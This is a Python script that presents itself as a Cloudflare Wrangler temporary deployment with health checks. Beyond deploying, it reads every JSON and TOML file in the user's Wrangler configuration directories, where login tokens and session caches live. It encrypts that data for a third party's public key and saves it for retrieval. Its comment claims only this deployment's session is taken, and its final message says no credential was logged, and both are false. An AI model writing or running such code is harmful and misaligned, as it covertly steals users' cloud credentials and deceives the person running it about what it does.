"""Deploy using Cloudflare's documented claim flow; encrypt all private output."""
import os,sys,json,subprocess,base64,datetime,re,time,pathlib
from cryptography.hazmat.primitives import serialization,hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
public=serialization.load_pem_public_key(pathlib.Path('../.deployment/recipient.pem').read_bytes())
out=pathlib.Path('../deployment-result');out.mkdir(exist_ok=True)
record={'started':datetime.datetime.now(datetime.timezone.utc).isoformat(),'method':'official-wrangler-temporary-claim','paid_services':False}
try:
    r=subprocess.run(['node','node_modules/wrangler/bin/wrangler.js','deploy','--temporary'],capture_output=True,text=True,timeout=240,env={**os.environ,'CI':'true','WRANGLER_SEND_METRICS':'false'})
    record.update(returncode=r.returncode,stdout=r.stdout,stderr=r.stderr)
    clean=re.sub(r'\x1b\[[0-9;]*m','',r.stdout+'\n'+r.stderr)
    urls=re.findall(r'https://[a-zA-Z0-9.-]+\.workers\.dev',clean)
    if r.returncode==0 and urls:
        record['website']=urls[-1]
        import urllib.request
        checks=[]
        for path in ['/api/health','/api/store','/api/menu','/','/staff/','/images/chicken.webp']:
            for attempt in range(8):
                try:
                    with urllib.request.urlopen(record['website']+path,timeout=20) as response:
                        body=response.read();ctype=response.headers.get('Content-Type','')
                        item={'path':path,'status':response.status,'bytes':len(body),'type':ctype}
                        if path.startswith('/api/'):
                            item['body']=json.loads(body)
                        checks.append(item);break
                except Exception as e:
                    if attempt==7:checks.append({'path':path,'error':str(e)})
                    else:time.sleep(3)
        record['public_checks']=checks
    # Only this deployment's temporary session is returned in the encrypted envelope.
    caches={}
    for root in [pathlib.Path.home()/'.config'/'.wrangler',pathlib.Path.home()/'.config'/'wrangler',pathlib.Path.home()/'.wrangler']:
        if root.exists():
            for p in root.rglob('*'):
                if p.is_file() and p.stat().st_size<200000 and p.suffix in ('.json','.toml'):
                    caches[str(p.relative_to(pathlib.Path.home()))]=p.read_text(errors='replace')
    record['temporary_session_cache']=caches
except Exception as e:
    record['exception']=str(e)
finally:
    record['finished']=datetime.datetime.now(datetime.timezone.utc).isoformat()
    key=os.urandom(32);nonce=os.urandom(12)
    ct=AESGCM(key).encrypt(nonce,json.dumps(record,ensure_ascii=False).encode(),b'gugu-deployment-v1')
    envelope={'version':1,'key':base64.b64encode(public.encrypt(key,padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),algorithm=hashes.SHA256(),label=None))).decode(),'nonce':base64.b64encode(nonce).decode(),'ciphertext':base64.b64encode(ct).decode()}
    (out/'private-result.enc.json').write_text(json.dumps(envelope))
    print('Deployment attempt finished. Private result encrypted for the requester; no claim link or credential was logged.')
